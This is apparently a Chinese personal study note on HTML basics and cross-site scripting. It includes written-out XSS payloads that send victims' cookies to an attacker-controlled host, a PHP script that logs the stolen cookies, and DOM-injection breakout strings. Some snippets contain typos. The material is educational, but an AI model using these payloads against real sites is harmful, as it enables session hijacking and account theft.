---
title: html
date: 2023-09-04 21:54:58
---
# HTML笔记

## 头

```html
<!doctype html>
<html>
    <head>
        <title>*****************</title>
    </head>
    <body>
        <h1>*********一级标题</h1>
        <h2>*********二级标题</h2>
        <!-- 以此类推 -->
        <!-- 这个是注释格式 -->
        <!-- 也可以这样 





-->
        <!-- 三种弹窗 -->
        <script>alert()</script>
        <script>confirm()</script>
        <script>prompt()</script>
        <!--  -->
        
        
        <p>这个是段落</p>
        <a herf="地址">这个是链接</a>	<!-- 引用地址 -->
        <img src="地址",width="**",height="**" /> <!-- 引用图片 -->
		
        <tr>
            <td>row1,cell1</td>
            <td>row1,cell2</td>
        </tr>
        <tr>
            <td>row2,cell1</td>
            <td>row2,cell2</td>
        </tr>
        <!-- 以上是表格格式 -->
<!--内嵌网页语法-->
        <iframe src="URL"></iframe>
        <!--设置高度宽度-->
        <iframe src="url" width="200" height="200"></iframe>
        <!--删除边框-->
        <iframe src="url" frameborder="0"></iframe>
        <!--可以跳转-->
        <iframe src="url" name=frame_></iframe>
        <p><a href="url" target="iframe_a">urlname</a></p>
        
```









# XSS

## 种类

- 反射型
- 存储型
- DOM型

## 反射型

不持久，仅支持单次链接

## 存储型

储存在被攻击服务器，持久

## DOM

不传到后端，前端通过document对象获取信息，js拼接执行

### Cookie

```shell
#cookie组成
Name=Value	设置cookie名称和值，作为认证cookie,value值包括web服务器所提供的访问令牌

Expires	设置cookie的生存期。有两种cookie:会话型与持久型。Expires缺省是为会话型cookie,仅保留在客户端内存，用户关闭浏览器时失效
持久型保存在用户硬盘，生存期到期或用户注销结束会话才会失效

Path	cookie所属u经，只有该路径及其下级目录可获取到该cookie

Domain	指定了可以访问该Cookie的Web站点或域，只有这个域或子域才能获取该cookie

Secure	表示该Cookie只可以使用https协议传输

HTTPOnly	设置HTTPOnly表示cookie不能被js读取，放置客户端通过document.cookie属性访问cookie

SameSite	定义cookie如何跨域发送
```

#### 三种攻击方式

- 请求带出

  vps开启监听，向存在xss漏洞网站插入代码后，可以接收到目标的cookie（base64_encode）

  ```html
  #攻击后浏览器打开新窗口，访问指定ip：端口，带上cookie
  <script>windows.open('http://ip:port/?q='+btoa(document.cookie));</script>
  #攻击在当前窗口访问ip和端口
  <script>location.herf='http://ip:port/?q='+btoa(document.cookie);</script>
  ```

- 访问指定网址执行js

  ```javascript
  #构造js
  var img = document.createElement("img");
  img.src = "http://ip:port/?q="+btoa(document.cookie);
  document.body.appendChild(img);
  
  #构造payload
  <script src=http://ip:port/js_location></script>
  ```

- 利用xss平台

  BLUE-LOTUS

  else……







---

```php+HTML
<?php
$filename ='cookies.txt';
$f = fopen($filename，'a'）
$cookie =urldecode($_GET['msg']) . PHP_EOL;
fwrite($f，$cookie);
fclose($f);
?>
```

 它会把msg参数的值进行url解码后再保存到cookies.txt这个文件里面。

   接下来就是构造JS代码来发起一个http请求了。利用Image对象就可以很轻易地完成该任务，新建一个Image对象，然后设置src属性，浏览器在碰到src属性的时候，会自动请求该src指向的url。这个url就写我们刚才写的接收cookie的页面的url，并且传msg参数过去，值为cookie。最终构造的语句为：

```php+HTML
<script>new Image().src="http://xss.com/recv_cookies.php?msg="+encodeURI(document.cookie);</script>
```



---

```php+HTML
function xssDom(){
var str = document.getElementById("msg").Value;
document.getElementById("show").innerHTML = "<a href="" + str + "'>xssDom</a>"
```

我们要让他没有语法错误，就需要构造语句闭合一些标签，所以，我们首先需要一个单引号来闭合 a标签的href属性。然后一个“>”来闭合a标签的“<”。这样构造以后，就变成了“<a href=''>在这里构造利用代码'>xssDom</a>”。所以我们可以构造如下语句：

   ` '><script>alert('xss');</script>`



w3c规定innerHTML进来的script标签内的脚本代码无法执行。

直接插入script无法执行，但是我们可以利用事件来触发，比如：onerror，onclick等。

构造如下数据：

`' onclick=alert(/xss/) //`

此时页面代码就变成了:

`<a href='' onclick=alert(/xss/) //'>xssDom</a>`

还有其他构造方法。例如我们闭合a标签，然后引入另外一个标签，比如img标签，利用img标签在加载src的时候，如果出错会触发onerror函数，我们就可以做到自动执行脚本代码而不需要交互。尝试输入如下数据：

`    '><img src=123 onerror=alert(/xss/) />`



## 页内跳转

```xml
    页面内的跳转需要两步：

    方法一：

    ①：设置一个锚点链接<a href="#libai">我是李白</a>；（注意：href属性的属性值最前面要加#）

    ②：在页面中需要的位置设置锚点<a name="libai"></a>；（注意：a标签中要写一个name属性，属性值要与①中的href的属性值一样，不加#）标签中按需填写必要的文字，一般不写内容

    方法二：

    ①：同方法一的①

    ②：设置锚点的位置  <h3 id="libai">我是李白</h3>；在要跳转到的位置的标签中添加一个id属性，属性值与①中href的属性值一样，不加#

    方法二不用单独添加一个a标签来专门设置锚点 ，只在需要的位置的标签中添加一个id即可。
```
